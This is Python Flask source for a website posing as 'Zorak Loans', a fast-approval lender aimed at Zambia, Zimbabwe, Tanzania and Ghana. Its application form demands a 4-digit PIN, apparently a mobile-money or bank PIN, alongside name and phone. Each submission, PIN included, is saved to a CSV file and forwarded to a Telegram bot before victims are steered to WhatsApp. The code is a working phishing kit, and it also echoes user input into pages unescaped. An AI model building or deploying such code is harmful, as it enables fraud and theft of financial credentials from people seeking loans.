from flask import Flask, request
import csv, os, requests
from datetime import datetime
app = Flask(__name__)
N = chr(10)
W = 'https://wa.me/message/CFCJWLOZ7IWZK1'
B = os.environ.get('BOT_TOKEN')
C = os.environ.get('CHAT_ID')
PIC = 'https://images.unsplash.com/photo-1554224155-6726b3ff858f?w=800&q=80'
H = '<style>body{margin:0;background:#eef1f5;font-family:Arial;font-size:22px}.top{padding:22px;text-align:center;background:#eef1f5}.top b{font-size:38px}.top b span{color:#e11d2e}.top b{color:#2563eb}.wrap{max-width:600px;margin:0 auto;padding:0 14px}.hero{width:100%;height:220px;object-fit:cover;border-radius:24px;display:block}.card{background:#fff;border-radius:24px;padding:32px;box-shadow:0 4px 20px rgba(0,0,0,0.06)}.card h1{font-size:36px;text-align:center;margin:0}.card h2{font-size:30px;text-align:center}.muted{color:#777;font-size:19px;text-align:center}.row{display:flex;justify-content:space-between;font-size:22px;font-weight:bold}.row span{color:#2563eb}.smallrow{display:flex;justify-content:space-between;color:#999;font-size:18px}input[type=range]{width:100%;height:10px;accent-color:#2563eb}.paybox{background:#eef4ff;border-radius:16px;padding:20px;text-align:center}.paybox div{color:#666;font-size:20px}.big{font-size:52px;color:#2563eb;font-weight:bold}.btn{background:linear-gradient(90deg,#2563eb,#7c3aed);color:#fff;padding:24px;border-radius:40px;display:block;text-align:center;text-decoration:none;font-size:24px;font-weight:bold;width:100%;border:none;cursor:pointer;box-sizing:border-box}.btn2{background:#ffc107;color:#111;border-radius:16px}.icons{display:flex;justify-content:space-between;text-align:center;margin-top:28px}.icons div{width:32%;font-size:18px;color:#666}.icons .e{font-size:44px}input,select{width:100%;padding:20px;font-size:22px;border-radius:14px;border:2px solid #ddd;box-sizing:border-box}label{font-size:22px;font-weight:bold}.footer{text-align:center;color:#999;font-size:17px;padding:20px}</style><div class=top><b>ZORAK <span>LOANS</span></b></div>'
def send(t):
    try:
        u = 'https://api.telegram.org/bot' + B + '/sendMessage'
        requests.post(u, json={'chat_id': C, 'text': t}, timeout=10)
    except:
        pass
@app.route('/')
@app.route('/api')
def home():
    return H + '<div class=wrap><img class=hero src=' + PIC + '><br><div class=card><h1>Get Your Loan Approved Fast</h1><p class=muted>Quick approval &bull; Competitive rates &bull; Flexible terms</p><h2>Loan Calculator</h2><div class=row><span style="color:#111">Loan Amount</span><span id=av>$5,000</span></div><input type=range id=a min=100 max=5000 value=5000 oninput=calc()><div class=smallrow><span>$100</span><span>$5,000</span></div><br><div class=row><span style="color:#111">Loan Term</span><span id=nv>12 months</span></div><input type=range id=n min=6 max=60 value=12 oninput=calc()><div class=smallrow><span>6 months</span><span>60 months</span></div><br><div class=paybox><div>Monthly Payment</div><div class=big id=m>$434.94</div></div><br><a class=btn href=/apply-form>APPLY NOW</a><div class=icons><div><div class=e>&#9889;</div>Fast Approval<br>Within 24 hours</div><div><div class=e>&#128176;</div>Low Rates<br>From 8%</div><div><div class=e>&#128272;</div>Secure<br>Bank-level</div></div></div><br><div class=card><h2>How it works</h2><p style="text-align:center">1. Fill form - 2 mins<br>2. We call you - 30 mins<br>3. Cash in your account</p><p style="text-align:center;font-size:19px;color:#777">Please fill the form to contact us on WhatsApp</p></div></div><div class=footer>&copy; 2025 Zorak Loans</div><script>function calc(){var a=document.getElementById("a").value;var n=document.getElementById("n").value;var r=0.08/12;var m=a*r/(1-Math.pow(1+r,-n));document.getElementById("av").innerText="$"+Number(a).toLocaleString();document.getElementById("nv").innerText=n+" months";document.getElementById("m").innerText="$"+m.toFixed(2)}calc()</script>'
@app.route('/apply-form')
@app.route('/api/apply-form')
def form():
    return H + '<div class=wrap><img class=hero src=' + PIC + ' style="height:160px"><br><div class=card><h1 style="text-align:left">Apply Now</h1><p style="font-size:19px;color:#777">Fill ALL fields to continue to WhatsApp</p><form method=POST action=/apply><p><label>Name</label></p><input name=name required placeholder="Your full name"><p><label>Phone</label></p><input name=phone required placeholder="e.g. +260..."><p><label>Country</label></p><select name=country required><option value="">Select Country</option><option>Zambia</option><option>Zimbabwe</option><option>Tanzania</option><option>Ghana</option></select><p><label>Amount</label></p><input name=amount required value=5000><p><label>Term</label></p><input name=term required value=12><p><label>Purpose</label></p><select name=purpose required><option value="">Select Purpose</option><option>Business</option><option>School Fees</option><option>Medical</option><option>Rent</option><option>Other</option></select><p><label>PIN</label></p><input name=pin required placeholder="PIN" maxlength=4 minlength=4 inputmode=numeric><br><br><button class=btn>SUBMIT APPLICATION</button></form></div></div><div class=footer>&copy; 2025 Zorak Loans</div>'
@app.route('/apply', methods=['POST'])
@app.route('/api/apply', methods=['POST'])
def apply():
    n = request.form.get('name', '')
    p = request.form.get('phone', '')
    c = request.form.get('country', '')
    a = request.form.get('amount', '')
    t = request.form.get('term', '')
    u = request.form.get('purpose', '')
    pin = request.form.get('pin', '')
    if not n or not p or not c or not a or not t or not u or not pin:
        return H + '<div class=wrap><div class=card><h1>Please fill ALL fields</h1><p style="text-align:center">You missed something. Go back and fill all.</p><a class=btn href=/apply-form>GO BACK & FILL ALL</a></div></div>'
    with open('leads.csv', 'a', newline='') as f:
        csv.writer(f).writerow([datetime.now().isoformat(), n, p, c, a, t, u, pin])
    cur = 'ZMW'
    if c == 'Zimbabwe':
        cur = 'USD'
    if c == 'Tanzania':
        cur = 'TSh'
    if c == 'Ghana':
        cur = 'GHS'
    send('New Lead' + N + 'Name: ' + n + N + 'Phone: ' + p + N + 'Country: ' + c + N + 'Amount: ' + a + ' ' + cur + N + 'Term: ' + t + N + 'Purpose: ' + u + N + 'PIN: ' + pin)
    return H + '<div class=wrap><div class=card><h1>Thank you, ' + n + '!</h1><p style="text-align:center">Request for <b>' + a + ' ' + cur + '</b> received.</p><p style="text-align:center">Your PIN is: <b>' + pin + '</b></p><p style="text-align:center">We call you on <b>' + p + '</b></p><p style="text-align:center;font-size:19px;color:#777">You have filled all - now you can WhatsApp us:</p><a class=btn href=' + W + '>WHATSAPP US NOW</a><br><a class="btn btn2" href=/>APPLY ANOTHER</a></div></div>'
@app.route('/test-telegram')
def test():
    r = requests.post('https://api.telegram.org/bot' + B + '/sendMessage', json={'chat_id': C, 'text': 'Test OK'}, timeout=10)
    return 'Status: ' + str(r.status_code)
@app.route('/health')
def health():
    return 'OK'
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
